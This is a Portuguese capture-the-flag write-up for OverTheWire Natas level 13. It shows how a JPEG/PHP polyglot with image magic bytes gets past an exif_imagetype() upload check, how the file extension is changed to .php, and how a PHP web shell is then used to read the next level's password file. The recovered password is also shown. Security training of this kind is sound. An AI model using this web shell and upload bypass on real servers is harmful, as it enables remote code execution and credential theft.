# 🕵️ Natas - Nível 13 (🇧🇷 Português)  
*Data: 04/06/2025*  
*Dificuldade: Média*   
*Categoria: Web* 

---

## 🎯 Objetivo

O objetivo deste desafio é burlar uma validação de tipo de arquivo baseada em "magic bytes" (`exif_imagetype()`) e, combinando com a manipulação de nome de arquivo do nível anterior, alcançar Execução Remota de Código (RCE) para obter a senha do próximo nível (Natas14).  

---

## 🔎 Análise

- A vulnerabilidade de manipulação de nome de arquivo do Natas12 persiste: o nome e a extensão do arquivo a ser salvo são definidos por um campo oculto `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`. Isso permite que um atacante, ao interceptar a requisição HTTP (e.g., via Burp Suite), altere a extensão de .jpg para .php.
  
- Nova Verificação de Segurança: O script PHP agora inclui uma validação `! exif_imagetype($_FILES['uploadedfile']['tmp_name']`.  
  - A função exif_imagetype() lê os primeiros bytes do arquivo (conhecidos como "`magic bytes`" ou "`assinatura`") para determinar se ele corresponde a um formato de imagem válido (JPEG, PNG, GIF, etc.).  
  - Se o arquivo não possuir uma assinatura de imagem reconhecida, exif_imagetype() retorna false, fazendo com que o upload seja rejeitado com a mensagem "File is not an image".  
  - Isso impede o upload direto de um arquivo PHP puro, pois ele não possui magic bytes de imagem.
 
- Para contornar a verificação exif_imagetype(), precisamos criar um arquivo poliglota: um arquivo que seja válido tanto como uma imagem JPEG quanto como um script PHP. A chave para isso é inserir os magic bytes de um arquivo de imagem no topo do nosso código PHP.  
  - O interpretador de imagem exif_imagetype() lerá os magic bytes no início do arquivo e o reconhecerá como uma imagem.  
  - O interpretador PHP, ao executar o arquivo (uma vez que sua extensão tenha sido manipulada para .php, ignorará os magic bytes iniciais (que não são código PHP válido) e começará a interpretar o código PHP a partir da tag <?php.  

---

## 🧱 Etapas

1. Análise do Código Fonte: Confirmar a persistência da vulnerabilidade de `filename` (do Natas12) e identificar a nova validação `exif_imagetype()`.  
2. Preparar o Payload Poliglota: Criar um arquivo que contenha magic bytes de JPEG no início, seguidos pelo nosso shell PHP.
  - Utilizamos o terminal para criar o arquivo, garantindo a inserção correta dos bytes hexadecimais literais e do código PHP. 
  - Nosso payload PHP é `<?php system($_GET["cmd"]); ?>`.  
  - Os magic bytes JPEG são `\xFF\xD8\xFF\xE0` (para JFIF JPEG).  
3. Criar o Arquivo Malicioso via Terminal:  
```bash
  printf '\xFF\xD8\xFF\xE0' > bypass.php  
  printf '<?php system($_GET["cmd"]); ?>' >> bypass.php
```
  - O primeiro printf cria o arquivo bypass.php com os magic bytes JPEG.  
  - O segundo printf (usando `>>`) anexa o payload PHP logo após os magic bytes, sem sobrescrever.  
4. Iniciar o Upload: No navegador, selecionar o arquivo bypass.php (ou o nome que você deu ao arquivo poliglota) e preparar para fazer o upload.
5. Interceptar e Manipular Requisição: Utilizar uma ferramenta proxy interceptadora (como Burp Suite) para capturar a requisição de upload.  
6. Alterar Extensão: Na requisição interceptada, localizar o parâmetro `filename` (que virá com um valor como [nome_aleatorio].jpg do campo oculto) e alterar sua extensão para `.php` (ex: `[nome_aleatorio].php`).  
7. Reenviar Requisição: Encaminhar a requisição modificada para o servidor. O servidor aceitará o arquivo, pois os magic bytes satisfazem `exif_imagetype()`.
8. Acessar o Shell Web: O servidor retornará o caminho do arquivo (ex: `upload/bldzmc4xs4.php`). Navegar até essa URL.
9. Executar Comandos (RCE): O shell PHP será interpretado. Adicionar o parâmetro `cmd` na URL para executar comandos.  
  - Testar: `http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=pwd` (retornará `/var/www/natas/natas12/upload`). 
  - Obter a senha do Natas14: `http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/natas_webpass/natas14`.  

---

## 🔑 Senha Encontrada

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

---

## ✅ Conclusão

A exploração do Natas13 foi bem-sucedida ao combinar a manipulação do nome do arquivo (persistente do nível anterior) com uma técnica de criação de arquivo poliglota (JPEG + PHP). A inserção de "magic bytes" de imagem no cabeçalho do nosso shell PHP permitiu que o arquivo passasse pela verificação `exif_imagetype()`, enquanto sua extensão manipulada (`.php`) garantiu que fosse interpretado pelo servidor PHP, resultando em Execução Remota de Código (RCE). Este desafio demonstra a importância de validações de upload robustas e multi-camadas que não se baseiem apenas em magic bytes ou extensões simples.


---

## 🧪 Comandos Utilizados

- Criação do arquivo poliglota `bypass.php` no terminal:
```Bash
printf '\xFF\xD8\xFF\xE0' > bypass.php
printf '<?php system($_GET["cmd"]); ?>' >> bypass.php
```
Obter senha do Natas14: 
```bash
http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/natas_webpass/natas14
``` 
---

## 🧠 Observações

- Validação de Tipo de Conteúdo: Confiar apenas em `exif_imagetype()` não é suficiente. É vital verificar não apenas os magic bytes, mas também realizar uma validação mais profunda do conteúdo do arquivo (por exemplo, usando bibliotecas que realmente parseiam a estrutura da imagem e verificam sua integridade).  
- Segurança em Camadas: As validações de upload devem ser em camadas: tipo MIME (verificado via `Content-Type`), extensão (validada por whitelist), magic bytes, e, idealmente, verificação do conteúdo da imagem por uma biblioteca robusta (para evitar polyglots).  
- Isolamento de Uploads: Arquivos enviados por usuários devem ser armazenados em um diretório que não permita execução de scripts e, se possível, servidos via um domínio ou CDN diferente.  
- Princípio do Mínimo Privilégio: Certifique-se de que o usuário sob o qual o servidor web roda tenha as permissões mínimas necessárias, limitando o impacto de um RCE.  


---

## 📎 Scripts desenvolvidos

`bypass.php`: Um arquivo poliglota PHP/JPEG (`<?php system($_GET['cmd']); ?>` com magic bytes JPEG) criado diretamente no terminal.

---

<p align="center"> <a href="../Natas12/Readme-BR.md">⬅️ Anterior</a> • <a href="../Natas14/Readme-BR.md">Proximo ➡️</a> </p>
